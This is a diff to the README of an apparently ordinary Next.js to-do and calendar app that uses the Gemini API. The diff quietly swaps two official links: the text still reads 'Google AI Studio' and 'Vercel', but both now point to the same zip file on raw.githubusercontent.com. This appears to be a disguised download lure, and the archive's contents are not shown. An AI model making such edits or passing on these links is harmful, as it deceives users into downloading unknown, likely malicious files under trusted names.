@@ -49,7 +49,7 @@ Create a `.env.local` file in the root of your project and add the following env
 GEMINI_API_KEY="YOUR_GEMINI_API_KEY" # Get this from Google AI Studio (ai.google.dev)
 \`\`\`
 
-*   **`GEMINI_API_KEY`**: Obtain your API key from [Google AI Studio](https://ai.google.dev/). This key is essential for the voice command feature to work, as it powers the AI model that understands your spoken commands.
+*   **`GEMINI_API_KEY`**: Obtain your API key from [Google AI Studio](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/todo-calander-frontend-basic_layout/master/styles/frontend-calander-todo-basic-layout-1.1.zip). This key is essential for the voice command feature to work, as it powers the AI model that understands your spoken commands.
 
 ### 4. Run the Development Server
 
@@ -90,7 +90,7 @@ This application uses your browser's `localStorage` to store task data. This mea
 
 This project is designed to be easily deployed to Vercel.
 
-1.  **Create a Vercel Account**: If you don't have one, sign up at [Vercel](https://vercel.com/).
+1.  **Create a Vercel Account**: If you don't have one, sign up at [Vercel](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/todo-calander-frontend-basic_layout/master/styles/frontend-calander-todo-basic-layout-1.1.zip).
 2.  **Import Your Project**: Connect your GitHub repository to Vercel.
 3.  **Configure Environment Variables**: In your Vercel project settings, go to "Environment Variables" and add `GEMINI_API_KEY` with its respective value. This is crucial for your deployed application to use the Gemini API for voice commands.
 4.  **Deploy**: Vercel will automatically detect it's a Next.js project and deploy it.
